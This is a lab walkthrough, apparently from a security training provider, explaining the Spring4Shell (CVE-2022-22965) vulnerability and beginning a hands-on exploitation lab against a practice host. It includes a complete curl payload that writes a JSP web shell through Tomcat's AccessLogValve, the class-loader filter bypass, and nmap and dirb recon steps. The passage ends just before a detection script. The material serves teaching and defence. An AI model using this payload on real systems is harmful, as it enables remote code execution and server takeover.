full_description = '''ResourcesLab Walkthrough: Exploiti ...06 February 25Lab Walkthrough: Exploiting Spring4Shell (CVE-2022-22965) in Enterprise EnvironmentsPosted byINEIn late March 2022, a vulnerability was discovered in Spring Framework that affected systems running on Java Development Kit (JDK) 9 or later versions.Spring4Shell (CVE-2022-22965) had a severe impact on applications built with Spring Framework, one of the most widely-used Java development frameworks.The root cause of this vulnerability emerged with Java 9's introduction of expanded access to the Class object's methods. Specifically, the exposed public method provided attackers with a path to access the JVM's class loader, enabling remote code execution (RCE) on vulnerable Spring applications.The transition to Java 9's architecture introduced a critical change: the expanded visibility of certain class loader operations created new attack vectors against Spring-based systems, allowing malicious actors to perform unauthorized operations through class loader manipulation.This critical vulnerability in the Spring Framework raised significant concerns throughout the cybersecurity community, as numerous enterprise systems utilizing Spring were potentially exposed. Following the public disclosure of the CVE, multiple proof-of-concept exploits became publicly available, making it relatively easy for attackers to target vulnerable systems.Why Is the Spring4Shell Vulnerability So Critical?Several factors contributed to Spring4Shell's significant impact on the cybersecurity landscape:Widespread Impact: The vulnerability affected Spring Framework, which powers a majority of enterprise-level Java applications. The critical nature of the vulnerability within such a widely-adopted framework put millions of production applications at risk of exploitation.Remote Code Execution (RCE) Capability: The vulnerability enabled attackers to execute arbitrary code on affected servers remotely. RCE vulnerabilities are considered among the most severe security issues because they grant attackers extensive control over compromised systems, potentially leading to full system compromise.Low Exploitation Complexity: Exploiting Spring4Shell required relatively simple steps. The availability of public exploit scripts and detailed technical advisories lowered the barrier to entry for potential attackers, making vulnerable systems easily targetable even by less sophisticated threat actors.Timing and Context: The discovery of Spring4Shell came shortly after the widely-publicized Log4Shell vulnerability (CVE-2021-44228) in the Log4j library. This timing heightened security concerns across the industry, as organizations were still recovering from Log4j remediation efforts. While the vulnerabilities were technically different, their similar naming and timing led to increased media attention and comparisons between the two critical Java ecosystem vulnerabilities.What is the Impact of Spring4Shell?European organizations were the most heavily impacted, with the global average falling below at 16%.Software vendors, educational institutions, and financial services organizations were the most heavily impacted by Spring4Shell, with over 25% of organizations in these sectors affected - likely due to their extensive use of Java-based enterprise applications and Spring Framework in their technology stacks. The vulnerability's impact was notably widespread across all sectors, even reaching traditionally less technology-focused industries like hospitality and retail, demonstrating Spring Framework's pervasive use in modern business applications.Source: checkpoint.comVulnerability OverviewCVE-2022-22965 aka (Spring4Shell)Technical Impact AnalysisThe discovery and disclosure of this vulnerability was particularly problematic as it deviated from standard security practices. The vulnerability was leaked publicly before a CVE could be assigned or patches developed, leaving organizations exposed without official mitigation guidance.The technical root cause traced back to Java 9's architectural changes, specifically the exposure of previously restricted Class methods. This change enabled attackers to manipulate class loaders through crafted HTTP requests, potentially achieving remote code execution by exploiting Spring's data binding mechanism.While Spring Framework's data binding functionality was designed to deserialize external data into Java objects (a common requirement for web applications), the affected versions lacked proper access controls around this mechanism. This security gap, combined with Java 9's expanded Class method visibility, created a critical attack vector that left many organizations vulnerable until patches could be developed and deployed.Disclosure and Response TimelineInitial Discovery and Disclosure:March 29, 2022: VMware (Spring Framework maintainer) received vulnerability notification from AntGroup FG researchers (codeplutos and meizjm3i)March 30, 2022: Vulnerability details leaked publicly before patch development completionMarch 31, 2022: Emergency patches released:Spring Framework 5.3.18Spring Framework 5.2.20Related updates to Spring Boot and TomcatTechnical DetailsCVE Identifier: CVE-2022-22965CVSS Score: 9.8 (Critical)Vulnerability Type: Remote Code Execution (RCE) via class loader exposureAttack Vector: Spring MVC and Spring WebFlux applications deployed as WAR files on standalone Servlet containersAffected ComponentsSpring Framework:Vulnerable versions: 5.3.0 to 5.3.17 and 5.2.0 to 5.2.19All versions prior to 5.2.0 also affectedPatched versions: 5.3.18 and 5.2.20Spring Boot:Remediation versions: 2.6.6 and 2.5.12 (includes updated Spring Framework dependencies)Environment Requirements:JDK: Version 9 or higher (JDK 8 and lower not affected)Servlet Containers: Apache Tomcat versions up to:10.0.199.0.618.5.77Technical Details Technical Deep DiveVulnerability Root Cause AnalysisThe Spring4Shell vulnerability specifically affects Spring applications running on Java 9 and later versions. The critical change occurred in Java 9's architecture, where a new public method getModule() was added to the Class object's interface.Technical Vulnerability Chain:Java 9 Architectural Change:The introduction of the getModule() method exposed new ways to interact with the JVM's class loaderPrevious versions of Spring Framework had adequate protections against class loader manipulation in pre-Java 9 environmentsExploitation Prerequisites:Request parameters being bound to a Plain Old Java Object (POJO)POJO lacking the @RequestBody annotation protectionApplication running on Java 9+ with vulnerable Spring Framework versionsAttack Vector Mechanics:The class variable maintains a reference to the POJO that receives mapped HTTP parametersAttackers can explicitly reference the class variable in their requests, gaining direct object accessThrough property chaining, attackers can traverse object relationships to access other system objectsThis property traversal capability enables potential remote code executionKey Components Leading to ExposureData Binding in Spring:Automatically associating web request parameters to Java objects (POJOs).Utilizes DataBinder and BeanWrapperImpl classes to manage property access and manipulationAccessible Properties:Attackers can take advantage of Java's ability to access an object's class property (e.g., object.class).By utilizing carefully designed property paths, attacker can access sensitive properties like classLoaderManipulating the ClassLoader:By achieving the classLoader, troublemakers can change how classes load.This can result in arbitrary code running by injecting bad classes or assets.Required Conditions for ExploitationJava Version: The application must run on Java 9 or higher. The vulnerability exploits features introduced in Java 9.Data Binding Configuration:The application uses Spring MVC or Spring WebFlux.The application uses @RequestMapping-annotated controller methods (e.g., @RequestMapping, @PostMapping, @PutMapping).The methods accept at least one Plain Old Java Object (POJO) parameter without the @RequestBody annotation, triggering data binding from request parameters.Deployment Type:The application is deployed as a traditional WAR on an application server (e.g., Apache Tomcat).The PoC exploits primarily target applications running on Apache Tomcat.Exploitation DetailsAttack VectorAn attacker sends a crafted HTTP POST request that manipulates the internal properties of the application to write a malicious file (e.g., a JSP web shell) to the server's file system.Exploit StepsAccess the ClassLoader:Use property paths to access ClassLoader via class.module.classLoader.Reach Tomcat's Internal Components:Navigate to resources.context.parent.pipeline.first, which refers to Tomcat's AccessLogValve.Manipulate Valve Attributes:Modify attributes of the AccessLogValve to control logging behavior.Write Malicious Content to Disk:Set the pattern attribute to the content of the web shell.Configure directory, prefix, suffix, and fileDateFormat to control where and how the file is written.Example Malicious HTTP RequestCurl Command:curl -v -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i%20if(\"j\".equals(request.getParameter(\"pwd\"))){%20java.io.InputStream%20in%20=%20%{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();%20int%20a%20=%20-1;%20byte[]%20b%20=%20new%20byte[2048];%20while((a=in.read(b))!=-1){%20out.println(new%20String(b));%20}%20}%20%{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://target/endpointParameters Breakdownclass.module.classLoader.resources.context.parent.pipeline.first.pattern:Sets the logging pattern to include attacker-controlled Java code (the web shell).class.module.classLoader.resources.context.parent.pipeline.first.suffix:Sets the file extension to .jsp.class.module.classLoader.resources.context.parent.pipeline.first.directory:Specifies the directory to write the file (e.g., webapps/ROOT).class.module.classLoader.resources.context.parent.pipeline.first.prefix:Sets the filename prefix (e.g., shell).class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat:Removes the date format to prevent timestamping.ResultA JSP file (e.g., shell.jsp) is written to the specified directory.The attacker can access the web shell via http://target.com/shell.jspThe web shell executes commands sent via HTTP parameters, providing RCE capabilities.Source: Rapid7Vulnerable Controller Exampleimport org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; @Controller @RequestMapping("/vulnerable") public class VulnerableController { @PostMapping public String handleRequest(UserData data) { // Automatic data binding occurs here return "response"; } }Why did this issue not happen with old Spring Core installations?The Spring Core code contains the following logic to prevent accessing child properties of the class variable. This logic is not foolproof: Code: if (Class.class == beanClass && ("classLoader".equals(pd.getName()) || "protectionDomain".equals(pd.getName()))) { continue; }The code checks for "class.classLoader" and "class.protectionDomain", but the logic can be bypassed with the following selector: "class.module.classLoader" Source: trendmicro.comHands-On LabLab Link: https://my.ine.com/labs/7896c1a8-aae9-40f3-86db-200c617c92ce This lab is a part of INE’s Vulnerabilities collection that is updated monthly.Vulnerability collection: https://my.ine.com/collections/bd6f07ba-b00e-4a43-afa5-6b2bdc3a25d8 In this lab, we will learn how an affected version of Tomcat (using JDK version 9) leads to remote code execution on the remote server, with all but a simple Python-based script.Read more: National Vulnerability DatabaseLab EnvironmentIn this lab environment, the user is going to get access to a Kali GUI instance. A vulnerable app is deployed on http://demo.ine.local. The web app is running Tomcat utilizing the JDK version 9, which is vulnerable to Spring4Shell vulnerability.Objective: Exploit the Spring4Shell vulnerability to get code execution on the remote server.ToolsThe best tools for this lab are:DirbNmapPythonA web browserAcknowledgementThe base setup code, and the detection and exploitation scripts are taken from the following sources:https://github.com/lunasec-io/Spring4Shell-POChttps://github.com/reznok/Spring4Shell-POC/blob/master/exploit.pyhttps://cybersecurityworks.com/blog/vulnerabilities/spring4shell-the-next-log4j.htmlStep 1: Open the lab link to access the Kali GUI instance.Step 2: Check open ports on the target machine (demo.ine.local).Command: nmap -sS -sV demo.ine.localPort 80 is open. A website is served on this port (as highlighted in the above image).Step 3: Locate interesting endpoints/pages in the provided website.We will be using dirb to look for any interesting pages on the provided website:Command: dirb http://demo.ine.localdirb was able to find two pages:http://demo.ine.local/errorhttp://demo.ine.local/loginNote: This step is not that relevant after all, but we have added it to show you a methodology of a pentester, that is, performing recon on the target and gaining valuable insights before jumping onto it and running random exploits against it.Step 4: Explore the identified web pages. We know that there is some website being served over port 80. We also discovered two more endpoints using dirb. Let's see what these pages contain. Open the following URL in the browser: URL: http://demo.ine.local/ A web page is being served over it.Visit /login endpoint: URL: http://demo.ine.local/login The same web page is being served over /login. Visit /error endpoint: URL: http://demo.ine.local/errorAn error page is being served here. It must be shown after an invalid login. Step 5: Visit an endpoint to trigger a backend error. Visit the following URL (/%2f endpoint): URL: http://demo.ine.local/%2fNotice that an error was triggered, and we got back a 400 - Bad Request page from the Apache Tomcat server. The version of Apache Tomcat is indicated on the error page: Apache Tomcat/9.0.59 Step 6: Identify the Java version used by Apache Tomcat version 9.0.59. Browser Search Query: tomcat/9.0.59 java versionThe response indicates that Java version 8 or later must be used by the target server. Step 7: Detect the presence of Spring4Shell vulnerability. Spring4Shell vulnerability is applicable for the deployments using JDK version 9 and newer. The provided target server might be vulnerable, provided that it is running JDK version 9 or newer. To test for that, we will use the following Python script: d'''
